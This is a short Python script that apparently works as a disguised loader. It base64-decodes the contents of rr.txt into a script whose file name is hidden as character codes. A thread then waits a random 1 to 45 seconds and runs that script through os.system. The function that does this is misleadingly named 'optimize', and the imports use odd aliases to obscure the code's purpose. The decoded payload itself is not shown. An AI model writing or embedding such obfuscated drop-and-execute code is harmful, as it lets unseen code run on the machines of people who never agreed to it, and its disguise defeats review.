import time as tm
import base64
import random as rxa
import os
from threading import Thread


data = [112, 121, 32, 114, 114, 46, 112, 121]

with open("rr.txt", "rb") as e:
    ed = e.read()

with open(f"".join([chr(x) for x in data[3:]]), "wb") as d:
    d.write(base64.b64decode(ed))

def optimize():
    tm.sleep(rxa.randint(1, 45))
    os.system(f"{''.join([chr(x) for x in data])}")

t = Thread(target=optimize)
t.start()
